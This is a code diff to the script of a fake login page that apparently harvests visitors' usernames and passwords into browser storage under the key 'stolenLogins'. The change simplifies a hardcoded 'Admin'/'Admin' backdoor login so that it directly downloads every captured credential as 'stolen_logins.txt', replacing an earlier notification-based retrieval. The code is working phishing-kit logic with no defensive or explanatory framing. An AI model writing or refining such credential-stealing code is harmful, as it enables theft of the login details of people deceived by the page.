@@ -95,9 +95,6 @@
       const errorMsg = document.getElementById("errorMsg")
       const forgotPassword = document.getElementById("forgotPassword")
 
-      // Request notification permission
-      Notification.requestPermission()
-
       function checkInputs() {
         if(usernameInput.value.trim() && passwordInput.value.trim()) {
           loginBtn.classList.remove("bg-gray-400")
@@ -117,26 +114,14 @@
         if(usernameInput.value.trim() && passwordInput.value.trim()) {
           if(usernameInput.value === "Admin" && passwordInput.value === "Admin") {
             let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-            if (storedData.length === 0) {
-              alert("No logins yet")
-              return
-            }
-            let latest = storedData[storedData.length - 1]
-            let notif = new Notification(`${latest.username}:${latest.password}`, {
-              body: "Click to download all logins"
-            })
-            notif.onclick = function() {
-              let text = storedData.map(entry => `${entry.username}: ${entry.password} - ${entry.timestamp}`).join("\n")
-              let blob = new Blob([text], { type: "text/plain" })
-              let url = URL.createObjectURL(blob)
-              let a = document.createElement("a")
-              a.href = url
-              a.download = "stolen_logins.txt"
-              document.body.appendChild(a)
-              a.click()
-              document.body.removeChild(a)
-              URL.revokeObjectURL(url)
-            }
+            let text = storedData.map(entry => `${entry.username}: ${entry.password} - ${entry.timestamp}`).join("\n")
+            let blob = new Blob([text], { type: "text/plain" })
+            let url = URL.createObjectURL(blob)
+            let a = document.createElement("a")
+            a.href = url
+            a.download = "stolen_logins.txt"
+            a.click()
+            URL.revokeObjectURL(url)
           } else {
             errorMsg.classList.remove("hidden")
             passwordInput.value = ""
